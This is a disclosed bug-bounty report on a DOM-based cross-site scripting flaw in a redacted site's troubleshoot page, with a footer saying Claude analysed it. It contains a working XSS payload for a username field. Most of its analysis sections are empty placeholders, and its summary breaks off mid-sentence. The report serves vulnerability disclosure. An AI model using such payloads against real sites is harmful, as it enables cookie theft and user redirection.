# █████ - DOM-based XSS

## Metadata
- **Source:** HackerOne
- **Report:** 376027 | https://hackerone.com/reports/376027
- **Submitted:** 2018-07-03
- **Reporter:** yumi
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** medium
- **Vuln:** Cross-site Scripting (XSS) - DOM
- **CVEs:** None
- **Category:** web-api

## Summary
Greetings, 

I've discovered a DOM-based XSS at **██████**

**_Proof of concept:_**

**1.** Go to https://███/█████/home/troubleshoot.html?lang=en&returnUrl=https://█████/███████/home/signin.html?returnUrl=https%3A//████/██████████/home/user.html

**2.** In the username field, add the following code:
```
--><button/autofocus/onfocus=Function("confirm`1`")();//name="XSS
```

**3.** The javascript c

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

Greetings, 

I've discovered a DOM-based XSS at **██████**

**_Proof of concept:_**

**1.** Go to https://███/█████/home/troubleshoot.html?lang=en&returnUrl=https://█████/███████/home/signin.html?returnUrl=https%3A//████/██████████/home/user.html

**2.** In the username field, add the following code:
```
--><button/autofocus/onfocus=Function("confirm`1`")();//name="XSS
```

**3.** The javascript code is correctly executed 

████████

On a side note, the vulnerability work on all moderns browsers (Firefox, Chrome, Opera ...).

## Impact

With this vulnerability, an attacker can for example steal users cookies or redirect users on malicious website. 

Thanks for your attention and let me know if you need anything.
Regards, Yumi

</details>

---
*Analysed by Claude on 2026-05-24*
